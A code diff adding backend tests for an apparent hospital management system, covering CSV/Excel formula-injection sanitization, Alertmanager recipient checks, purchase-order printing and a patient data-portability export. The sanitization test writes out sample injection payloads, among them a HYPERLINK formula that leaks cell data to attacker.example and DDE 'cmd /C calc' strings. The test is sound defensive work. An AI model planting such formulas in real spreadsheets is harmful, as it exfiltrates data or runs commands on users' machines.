@@ -121,3 +121,365 @@ def test_n94_index_builder_handles_invalid_indexes_and_idempotent_migration():
     assert "DROP INDEX CONCURRENTLY IF EXISTS" in builder_text
     assert "get_invalid_postgres_indexes" in builder_text
 
+
+def test_n96_spreadsheet_formula_injection_sanitization():
+    """
+    N-96: Formulas starting with =, +, -, @, \\t, or \\r must be prefixed with a single quote (')
+    to prevent spreadsheet injection (CSV/Excel DDE), while preserving valid numbers.
+    """
+    from backend.core.export import sanitize_spreadsheet_cell, format_export_cell
+
+    assert sanitize_spreadsheet_cell('=HYPERLINK("http://attacker.example/c?d="&B2,"Click")').startswith("'=")
+    assert sanitize_spreadsheet_cell('@SUM(1+1)*cmd').startswith("'@")
+    assert sanitize_spreadsheet_cell('\tcmd /C calc').startswith("'\t")
+    assert sanitize_spreadsheet_cell('+calc').startswith("'+")
+
+    # Valid numbers with signs must remain unchanged
+    assert sanitize_spreadsheet_cell("-42") == "-42"
+    assert sanitize_spreadsheet_cell("+3.14") == "+3.14"
+    assert sanitize_spreadsheet_cell("-0.05") == "-0.05"
+    assert sanitize_spreadsheet_cell("Plain Text") == "Plain Text"
+
+    # Formatted cell export
+    assert format_export_cell("=cmd|' /C calc'!A0").startswith("'=")
+
+
+def test_n99_production_alertmanager_recipient_enforcement(tmp_path):
+    """
+    N-99: Production Alertmanager configuration must reject missing, invalid,
+    or placeholder recipient emails (oncall@avinya-hms.local) instead of silently substituting them.
+    """
+    out_file = tmp_path / "am_test.yml"
+
+    # 1. Missing recipient in production
+    missing_env = tmp_path / "missing_recipient.env"
+    missing_env.write_text(
+        "ENVIRONMENT=production\n"
+        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n",
+        encoding="utf-8",
+    )
+    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
+        render_alertmanager_config(env_file=missing_env, output_file=out_file)
+
+    # 2. Placeholder recipient in production
+    placeholder_env = tmp_path / "placeholder_recipient.env"
+    placeholder_env.write_text(
+        "ENVIRONMENT=production\n"
+        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n"
+        "ALERT_EMAIL_TO=oncall@avinya-hms.local\n",
+        encoding="utf-8",
+    )
+    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
+        render_alertmanager_config(env_file=placeholder_env, output_file=out_file)
+
+    # 3. Invalid email without '@'
+    bad_email_env = tmp_path / "bad_email.env"
+    bad_email_env.write_text(
+        "ENVIRONMENT=production\n"
+        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n"
+        "ALERT_EMAIL_TO=invalid-oncall-address\n",
+        encoding="utf-8",
+    )
+    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
+        render_alertmanager_config(env_file=bad_email_env, output_file=out_file)
+
+
+def test_n100_procurement_purchase_order_html_print(client, superuser_headers):
+    """
+    N-100: GET /api/procurement/purchase-orders/{id}/print?format=html must render HTML
+    without crashing due to missing HTMLResponse import.
+    """
+    from datetime import datetime, timedelta, timezone
+
+    # 1. Create vendor
+    v_res = client.post(
+        "/v1/api/procurement/vendors",
+        headers=superuser_headers,
+        json={
+            "code": f"VND-{os.urandom(3).hex().upper()}",
+            "name": "PharmaCorp Supplies",
+            "category": "PHARMACEUTICALS",
+            "contact_person": "Jane Doe",
+            "phone": "9876543210",
+            "email": "orders@pharmacorp.internal",
+            "address": "123 Logistics Park",
+            "credit_period_days": 30,
+        },
+    )
+    assert v_res.status_code == 201, f"Vendor creation failed: {v_res.text}"
+    vendor_id = v_res.json()["id"]
+
+    # 2. Create purchase order
+    po_res = client.post(
+        "/v1/api/procurement/purchase-orders",
+        headers=superuser_headers,
+        json={
+            "vendor_id": vendor_id,
+            "delivery_due_date": (datetime.now(timezone.utc) + timedelta(days=10)).isoformat(),
+            "payment_terms": "Net 30 Days",
+            "items": [
+                {
+                    "item_description": "Paracetamol 500mg Bulk",
+                    "quantity_ordered": 100,
+                    "unit_price_paise": 250,
+                }
+            ],
+        },
+    )
+    assert po_res.status_code == 201, f"PO drafting failed: {po_res.text}"
+    po_id = po_res.json()["id"]
+
+    # 2b. Approve PO (only approved POs can be printed)
+    app_res = client.patch(
+        f"/v1/api/procurement/purchase-orders/{po_id}/approve",
+        headers=superuser_headers,
+    )
+    assert app_res.status_code == 200, f"PO approval failed: {app_res.text}"
+
+    # 3. Print HTML
+    html_res = client.get(
+        f"/v1/api/procurement/purchase-orders/{po_id}/print?format=html",
+        headers=superuser_headers,
+    )
+    assert html_res.status_code == 200
+    assert "text/html" in html_res.headers.get("content-type", "")
+    assert "Paracetamol 500mg Bulk" in html_res.text
+
+
+def test_n98_dpdp_dossier_populated_and_integrity(client, superuser_headers, multi_tenant_env):
+    """
+    N-98: The DPDP Section 11 data portability dossier must export authentic master fields:
+    allergen names and reactions, ICD-10 diagnosis codes and remarks, medicine brand/strength/dosage,
+    and diagnostic order investigations with result values, without crashing on invented attributes.
+    """
+    from datetime import datetime, timezone
+    from sqlalchemy.orm import sessionmaker
+    from backend.domains.patients.models import Patient, AllergyMaster, PatientAllergy, AllergySeverityEnum, GenderEnum, AllergyCategoryEnum
+    from backend.domains.clinical.models import EncounterDiagnosis, DiagnosisMaster, DiagnosisTypeEnum
+    from backend.domains.encounters.models import PatientEncounter, EncounterTypeEnum, EncounterStatusEnum
+    from backend.domains.pharmacy.models import Prescription, PrescriptionItem, PrescriptionStatusEnum, MedicationMaster, MedicationFormEnum
+    from backend.domains.diagnostics.models import DiagnosticOrder, DiagnosticTask, OrderStatusEnum, TaskStatusEnum, ServiceCatalog, ServiceCategory, ServiceTypeEnum
+    from backend.domains.facility.models import Department
+    from backend.domains.identity.models import User
+    from backend.domains.privacy.models import PatientDataRightsRequest, PrivacyDecisionAudit
+
+    SessionLocal = sessionmaker(bind=multi_tenant_env["tenant_engines"]["hms_default"])
+    with SessionLocal() as db:
+        # 1. Create doctor/user
+        user = db.query(User).first()
+
+        # 2. Seed department & services
+        dept = db.query(Department).first()
+        if not dept:
+            dept = Department(name="Diagnostics", code="DIAG-01", is_active=True)
+            db.add(dept)
+            db.commit()
+
+        cat = db.query(ServiceCategory).first()
+        if not cat:
+            cat = ServiceCategory(name="Laboratory", code="LAB-CAT", department_id=dept.id, is_active=True)
+            db.add(cat)
+            db.commit()
+
+        service = db.query(ServiceCatalog).filter_by(code="LAB-FBS-01").first()
+        if not service:
+            service = ServiceCatalog(
+                category_id=cat.id,
+                code="LAB-FBS-01",
+                name="Fasting Blood Sugar",
+                service_type=ServiceTypeEnum.LAB,
+                base_price_paise=25000,
+                loinc_code="1558-6",
+                is_active=True,
+            )
+            db.add(service)
+            db.commit()
+
+        # 3. Seed medication master
+        med = db.query(MedicationMaster).filter_by(code="MED-MET-500").first()
+        if not med:
+            med = MedicationMaster(
+                code="MED-MET-500",
+                brand_name="Metformin-500",
+                generic_name="Metformin Hydrochloride",
+                form=MedicationFormEnum.TABLET,
+                strength="500 mg",
+                is_active=True,
+            )
+            db.add(med)
+            db.commit()
+
+        # 4. Seed diagnosis master
+        diag = db.query(DiagnosisMaster).filter_by(icd10_code="E11.9").first()
+        if not diag:
+            diag = DiagnosisMaster(
+                department_id=dept.id,
+                icd10_code="E11.9",
+                short_description="Type 2 diabetes mellitus without complications",
+                full_description="Type 2 diabetes mellitus without complications (diet-controlled)",
+                is_billable=True,
+                is_active=True,
+            )
+            db.add(diag)
+            db.commit()
+
+        # 5. Seed allergy master
+        allergy_m = db.query(AllergyMaster).filter_by(code="ALL-PEN-01").first()
+        if not allergy_m:
+            allergy_m = AllergyMaster(
+                department_id=dept.id,
+                code="ALL-PEN-01",
+                name="Penicillin",
+                category=AllergyCategoryEnum.DRUG,
+                is_active=True,
+            )
+            db.add(allergy_m)
+            db.commit()
+
+        # 6. Create patient
+        mrn_rand = f"MRN-{os.urandom(3).hex().upper()}"
+        p = Patient(
+            mrn=mrn_rand,
+            full_name="Lakshmi Narayanan",
+            date_of_birth=datetime(1985, 4, 12, tzinfo=timezone.utc),
+            gender=GenderEnum.FEMALE,
+            phone_number="9876543210",
+            is_active=True,
+        )
+        db.add(p)
+        db.commit()
+        db.refresh(p)
+
+        # 7. Add patient allergy with reaction
+        p_allergy = PatientAllergy(
+            patient_id=p.id,
+            allergy_id=allergy_m.id,
+            severity=AllergySeverityEnum.SEVERE,
+            reaction_description="Anaphylaxis and generalized urticaria",
+            recorded_by_user_id=user.id,
+            is_active=True,
+        )
+        db.add(p_allergy)
+
+        # 8. Add encounter, diagnosis, prescription, and diagnostic order
+        enc = PatientEncounter(
+            patient_id=p.id,
+            encounter_type=EncounterTypeEnum.OPD,
+            status=EncounterStatusEnum.ACTIVE,
+            primary_doctor_id=user.id,
+            department_id=dept.id,
+            created_at=datetime.now(timezone.utc),
+        )
+        db.add(enc)
+        db.commit()
+        db.refresh(enc)
+
+        enc_diag = EncounterDiagnosis(
+            encounter_id=enc.id,
+            diagnosis_id=diag.id,
+            diagnosis_type=DiagnosisTypeEnum.PRIMARY,
+            clinical_remarks="Diet and lifestyle controlled, baseline screening",
+        )
+        db.add(enc_diag)
+
+        rx = Prescription(
+            encounter_id=enc.id,
+            prescribing_doctor_id=user.id,
+            status=PrescriptionStatusEnum.ACTIVE,
+            clinical_notes="Take with meals",
+        )
+        db.add(rx)
+        db.commit()
+        db.refresh(rx)
+
+        rx_item = PrescriptionItem(
+            prescription_id=rx.id,
+            medication_id=med.id,
+            dosage_instruction="500 mg twice daily with meals",
+            requested_quantity=60,
+            dispensed_quantity=60,
+        )
+        db.add(rx_item)
+
+        # Diagnostic order with task and result
+        diag_order = DiagnosticOrder(
+            patient_id=p.id,
+            ordering_doctor_id=user.id,
+            clinical_notes="Routine diabetes monitoring",
+            status=OrderStatusEnum.COMPLETED,
+        )
+        db.add(diag_order)
+        db.commit()
+        db.refresh(diag_order)
+
+        task = DiagnosticTask(
+            order_id=diag_order.id,
+            service_id=service.id,
+            status=TaskStatusEnum.VERIFIED,
+            result_value="110 mg/dL",
+            result_notes="Fasting blood glucose within target range",
+            is_critical_panic=False,
+        )
+        db.add(task)
+
+        # Submit data-rights request
+        dr_req = PatientDataRightsRequest(
+            patient_id=p.id,
+            request_type="PORTABILITY",
+            status="SUBMITTED",
+            details={"reason": "Patient Section 11 request"},
+            sla_deadline=datetime.now(timezone.utc),
+        )
+        db.add(dr_req)
+        db.commit()
+        db.refresh(dr_req)
+
+        # 9. Call dossier export endpoint
+        res = client.get(
+            f"/v1/api/privacy/data-rights/patients/{p.id}/export-dossier?request_id={dr_req.id}",
+            headers=superuser_headers,
+        )
+        assert res.status_code == 200, f"Expected 200 OK, got {res.status_code}: {res.text}"
+        dossier = res.json()
+
+        # Verify bundle integrity hash
+        assert "bundle_integrity_sha256" in dossier["export_metadata"]
+        assert len(dossier["export_metadata"]["bundle_integrity_sha256"]) == 64
+
+        # Verify allergies
+        assert len(dossier["allergies"]) == 1
+        assert dossier["allergies"][0]["allergen"] == "Penicillin"
+        assert dossier["allergies"][0]["reaction"] == "Anaphylaxis and generalized urticaria"
+        assert dossier["allergies"][0]["severity"] == "SEVERE"
+
+        # Verify diagnoses
+        assert len(dossier["diagnoses"]) == 1
+        assert dossier["diagnoses"][0]["icd10_code"] == "E11.9"
+        assert dossier["diagnoses"][0]["condition_name"] == "Type 2 diabetes mellitus without complications"
+        assert dossier["diagnoses"][0]["clinical_remarks"] == "Diet and lifestyle controlled, baseline screening"
+
+        # Verify prescriptions
+        assert len(dossier["prescriptions"]) == 1
+        rx_items = dossier["prescriptions"][0]["items"]
+        assert len(rx_items) == 1
+        assert rx_items[0]["brand_name"] == "Metformin-500"
+        assert rx_items[0]["strength"] == "500 mg"
+        assert rx_items[0]["dosage_instruction"] == "500 mg twice daily with meals"
+
+        # Verify diagnostics & results
+        assert len(dossier["diagnostics"]) == 1
+        invs = dossier["diagnostics"][0]["investigations"]
+        assert len(invs) == 1
+        assert invs[0]["service_name"] == "Fasting Blood Sugar"
+        assert invs[0]["loinc_code"] == "1558-6"
+        assert invs[0]["result_value"] == "110 mg/dL"
+        assert invs[0]["is_critical_panic"] is False
+
+        # Verify tamper-evident PrivacyDecisionAudit entry
+        audit = db.query(PrivacyDecisionAudit).filter_by(
+            data_use_point="privacy.data_rights.export_dossier",
+            purpose_code="DPDP_SECTION_11_PORTABILITY",
+        ).first()
+        assert audit is not None
+        assert f"patient_id={p.id}" in audit.reason_code
+
